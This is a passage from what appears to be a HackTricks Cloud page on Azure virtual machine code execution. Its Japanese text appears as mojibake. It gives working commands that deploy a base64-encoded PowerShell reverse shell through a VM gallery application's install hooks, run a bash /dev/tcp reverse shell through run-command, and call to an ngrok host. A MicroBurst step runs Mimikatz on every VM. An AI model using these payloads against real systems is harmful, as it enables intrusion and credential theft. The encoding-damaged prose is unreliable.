export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
az sig gallery-application version create \
--version-name 1.0.0 \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "powershell.exe -EncodedCommand $encodedCommand" \
--remove-command "powershell.exe -EncodedCommand $encodedCommand" \
--update-command "powershell.exe -EncodedCommand $encodedCommand"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name deleteme-win4 \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellAppWin/versions/1.0.0 \
--treat-deployment-as-failure true
```
{% endcode %}
{% endtab %}
{% endtabs %}

### ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿

ã“ã‚Œã¯**æ°¸ç¶šãƒ‡ãƒ¼ã‚¿**ã§ã‚ã‚Šã€ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰ã„ã¤ã§ã‚‚å–å¾—ã§ãã¾ã™ã€‚Azureã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿ã¯AWSã‚„GCPã¨ã¯ç•°ãªã‚Šã€**ã“ã“ã«ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ç½®ã„ã¦ã‚‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“**ã€‚

### ã‚«ã‚¹ã‚¿ãƒ ãƒ‡ãƒ¼ã‚¿

VMã«ãƒ‡ãƒ¼ã‚¿ã‚’æ¸¡ã™ã“ã¨ãŒå¯èƒ½ã§ã€æœŸå¾…ã•ã‚Œã‚‹ãƒ‘ã‚¹ã«ä¿å­˜ã•ã‚Œã¾ã™ï¼š

* **Windows**ã§ã¯ã€ã‚«ã‚¹ã‚¿ãƒ ãƒ‡ãƒ¼ã‚¿ã¯`%SYSTEMDRIVE%\AzureData\CustomData.bin`ã«ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã¨ã—ã¦é…ç½®ã•ã‚Œã€å‡¦ç†ã•ã‚Œã¾ã›ã‚“ã€‚
* **Linux**ã§ã¯ã€`/var/lib/waagent/ovf-env.xml`ã«ä¿å­˜ã•ã‚Œã¦ã„ã¾ã—ãŸãŒã€ç¾åœ¨ã¯`/var/lib/waagent/CustomData/ovf-env.xml`ã«ä¿å­˜ã•ã‚Œã¦ã„ã¾ã™ã€‚
* **Linuxã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ**ï¼šãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã‚«ã‚¹ã‚¿ãƒ ãƒ‡ãƒ¼ã‚¿ã‚’å‡¦ç†ã›ãšã€ãƒ‡ãƒ¼ã‚¿ãŒæœ‰åŠ¹ãªã‚«ã‚¹ã‚¿ãƒ ã‚¤ãƒ¡ãƒ¼ã‚¸ãŒå¿…è¦ã§ã™ã€‚
* **cloud-init:** ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã‚«ã‚¹ã‚¿ãƒ ãƒ‡ãƒ¼ã‚¿ã‚’å‡¦ç†ã—ã€ã“ã®ãƒ‡ãƒ¼ã‚¿ã¯[**ã„ãã¤ã‹ã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆ**](https://cloudinit.readthedocs.io/en/latest/explanation/format.html)ã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã‚«ã‚¹ã‚¿ãƒ ãƒ‡ãƒ¼ã‚¿ã«ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’é€ä¿¡ã™ã‚‹ã ã‘ã§ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ç°¡å˜ã«å®Ÿè¡Œã§ãã¾ã™ã€‚
* Ubuntuã¨Debianã®ä¸¡æ–¹ãŒã“ã“ã«ç½®ã„ãŸã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’è©¦ã—ã¾ã—ãŸã€‚
* ã“ã‚ŒãŒå®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿ã‚’æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
```bash
#!/bin/sh
echo "Hello World" > /var/tmp/output.txt
```
### **ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œ**

ã“ã‚Œã¯ã€AzureãŒæä¾›ã™ã‚‹æœ€ã‚‚åŸºæœ¬çš„ãªãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã§ã€**VMå†…ã§ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œ**ã—ã¾ã™ã€‚å¿…è¦ãªæ¨©é™ã¯`Microsoft.Compute/virtualMachines/runCommand/action`ã§ã™ã€‚

{% tabs %}
{% tab title="Linux" %}
```bash
# Execute rev shell
az vm run-command invoke \
--resource-group <rsc-group> \
--name <vm-name> \
--command-id RunShellScript \
--scripts @revshell.sh

# revshell.sh file content
echo "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" > revshell.sh
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
# Execute a rev shell
az vm run-command invoke \
--resource-group Research \
--name juastavm \
--command-id RunPowerShellScript \
--scripts @revshell.ps1

## Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

## Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

# The content of
echo "powershell.exe -EncodedCommand $encodedCommand" > revshell.ps1


# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

## æ¨©é™æ˜‡æ ¼

{% content-ref url="../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md" %}
[az-virtual-machines-and-network-privesc.md](../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md)
{% endcontent-ref %}

## èªè¨¼ã•ã‚Œã¦ã„ãªã„ã‚¢ã‚¯ã‚»ã‚¹

{% content-ref url="../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md" %}
[az-vms-unath.md](../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md)
{% endcontent-ref %}

## ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

{% content-ref url="../../az-post-exploitation/az-vms-and-network-post-exploitation.md" %}
[az-vms-and-network-post-exploitation.md](../../az-post-exploitation/az-vms-and-network-post-exploitation.md)
{% endcontent-ref %}

## æ°¸ç¶šæ€§

{% content-ref url="../../az-persistence/az-vms-persistence.md" %}
[az-vms-persistence.md](../../az-persistence/az-vms-persistence.md)
{% endcontent-ref %}

## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)
* [https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
